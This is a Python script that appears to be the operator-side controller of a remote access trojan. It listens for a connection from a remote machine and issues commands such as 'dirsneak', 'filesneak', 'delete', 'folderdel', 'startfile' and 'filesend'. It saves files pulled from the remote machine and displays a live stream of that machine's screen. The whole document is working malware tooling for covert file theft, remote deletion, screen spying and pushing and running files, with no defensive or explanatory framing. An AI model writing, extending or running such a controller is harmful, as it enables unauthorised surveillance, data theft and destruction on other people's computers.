import socket
from threading import Thread
import getpass
import os
import sys
from time import sleep
from zlib import decompress
import pygame

WIDTH = 1920
HEIGHT = 1080

username = getpass.getuser()

listen_type = ''
txt_response = ''
listener_flag = 1
speaker_flag = 1

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''
port = 3653

sock.bind((host, port))
sock.listen(10)

conn, addr = sock.accept()

print(conn.recv(1024).decode())

def recvall(conn, length):
    """ Retreive all pixels. """
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))

        if not data:
            return data
        buf += data
    return buf

def clear_buffer(sock):
    try:
        while sock.recv(1024):
            print('clearing')

    except:
        print('not clearing')

def listener():
    global txt_response, listener_flag, speaker_flag, listen_type, conn, sock
    while listener_flag:
        try:
            if listen_type == 'txt':
                sleep(0.1)
                txt_response = conn.recv(1024).decode()
                print(txt_response)
                if txt_response == 'quiting':
                    sleep(0.1)
                    listener_flag = 0
                    speaker_flag = 0
                    break
            if listen_type == 'file':
                file_size = float(conn.recv(1024).decode())
                full_step = round(file_size/1024)
                print('full step:', full_step)
                counter = 0
                print(file_size)
                data = conn.recv(1024)
                file = open("C:\\Users\\{}\\Desktop\\recv".format(username), 'wb')
                while True:
                    while data:
                        file.write(data)
                        data = conn.recv(1024)
                        #print(os.path.getsize("C:\\Users\\{}\\Desktop\\recv".format(username)))
                        counter += 1
                        sys.stdout.write('\r')
                        if full_step < 100:
                            sys.stdout.write(
                                "file receiving:[{}]{}/{}".format('*' * counter + ' ' * (full_step - counter),
                                                                  counter * 1024, file_size))
                        else:
                            sys.stdout.write("file receiving:[{}]{}/{}".format('*' * round(counter/(counter/100)) + ' ' * round((full_step - counter)/((full_step-counter)/100)), counter * 1024, file_size))

                        if counter+1 >= full_step:
                            file.write(data)
                            break

                    file.close()
                    listen_type = ''
                    break
            if listen_type == 'screen':
                pygame.init()
                screen = pygame.display.set_mode((WIDTH, HEIGHT))
                clock = pygame.time.Clock()
                watching = True

                try:
                    sleep(0.5)
                    while watching:
                        for event in pygame.event.get():
                            if event.type == pygame.QUIT:
                                watching = False
                                conn.send('0'.encode())
                                break

                        # Retreive the size of the pixels length, the pixels length and pixels
                        size_len = int.from_bytes(conn.recv(1), byteorder='big')
                        data = conn.recv(size_len)
                        size = int.from_bytes(data, byteorder='big')

                        pixels = decompress(recvall(conn, size))

                        # Create the Surface from raw pixels
                        img = pygame.image.fromstring(pixels, (WIDTH, HEIGHT), 'RGB')

                        # Display the picture
                        screen.blit(img, (0, 0))
                        pygame.display.flip()
                        clock.tick(60)
                finally:
                    print('done')

        except:
            print('listener error')

def speaker(conn):
    global speaker_flag, listen_type
    while speaker_flag:
        if speaker_flag == 0:
            break
        try:
            command = input('\ncommand:')
            try:
                variables = command.split(', ')
                action_command = variables[0]
                target_value = variables[1]
                if len(variables)>2:
                    tosend_value = variables[2]
                command = action_command + ', ' + target_value
            except:
                action_command = command
            if action_command == 'hi' or action_command == 'dirsneak' or action_command == 'quit' or action_command == 'username' or action_command=='delete' or action_command=='folderdel' or action_command=='dirmake' or action_command=='startfile' or action_command=='fileexten':
                listen_type = 'txt'
            elif action_command == 'filesneak':
                listen_type = 'file'
            elif action_command == 'screen':
                #clear_buffer(conn)
                listen_type = 'screen'
            conn.send(command.encode())
            if action_command == 'filesend':
                #listen_type = 'filesend'
                file_size = os.path.getsize(tosend_value)
                full_steps = round(file_size/1024)
                conn.send(str(file_size).encode())
                file = open(tosend_value, 'rb')
                SendData = file.read(1024)
                counter = 0
                while SendData:
                    sys.stdout.write('\r')
                    sys.stdout.write('file sending[{}]{}/{}'.format('*'*counter+' '*(full_steps-counter), counter*1024, file_size))
                    sys.stdout.flush()
                    counter += 1
                    conn.send(SendData)
                    SendData = file.read(1024)
                file.close()
        except:
            print('speaker error')

listener_thread = Thread(target=listener)
speaker_thread = Thread(target=speaker, args=(conn, ))
listener_thread.start()
speaker_thread.start()